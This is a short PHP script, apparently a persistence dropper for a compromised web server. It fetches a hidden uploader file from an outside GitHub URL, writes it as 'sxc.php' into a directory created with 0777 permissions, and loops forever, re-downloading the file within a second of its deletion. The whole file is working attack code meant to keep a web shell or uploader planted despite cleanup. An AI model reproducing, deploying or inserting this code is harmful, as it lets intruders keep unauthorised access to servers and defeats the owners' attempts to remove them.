<?php

$link = "https://raw.githubusercontent.com/SecurityXploitcrew/Hidden-Uploader/main/uploader.php";
$directory = "memek";
$file = "sxc.php";

// Make sure the directory exists
function ensureDirectory($directory) {
    if (!file_exists($directory)) {
        mkdir($directory, 0777, true); // Create the directory with proper permissions
    }
}

function shel($link, $directory, $file) {
    ensureDirectory($directory); // Ensure the directory exists

    $x = file_get_contents($link);
    $filePath = $directory . '/' . $file; // Construct the full file path
    $f = fopen($filePath, 'w');

    fwrite($f, $x);
    fclose($f);
}

while (1) {
    $filePath = $directory . '/' . $file;
    if (!file_exists($filePath)) {
        shel($link, $directory, $file);
    }
    sleep(1);
}
?>
